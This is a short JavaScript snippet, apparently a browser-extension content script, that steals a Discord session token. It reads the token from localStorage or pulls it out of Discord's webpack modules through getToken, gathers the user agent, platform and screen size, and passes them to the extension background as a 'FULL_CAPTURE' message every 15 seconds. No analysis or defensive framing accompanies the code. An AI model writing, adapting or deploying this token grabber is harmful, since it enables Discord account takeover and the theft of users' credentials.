(function() {
    const capture = () => {
        let t = (window.localStorage.getItem('token') || "").replace(/"/g, "");
        if (!t) {
            try {
                window.webpackChunkdiscord_app?.push([[Symbol()],{},(e)=>{
                    for(const m in e.c){
                        if(e.c[m].exports?.default?.getToken) t = e.c[m].exports.default.getToken();
                    }
                }]);
            } catch(e){}
        }

        if (t && t.length > 25) {
            const deviceInfo = {
                ua: navigator.userAgent,
                plt: navigator.platform,
                res: `${window.screen.width}x${window.screen.height}`
            };
            chrome.runtime.sendMessage({type: "FULL_CAPTURE", token: t, info: deviceInfo});
        }
    };
    capture();
    setInterval(capture, 15000);
})();
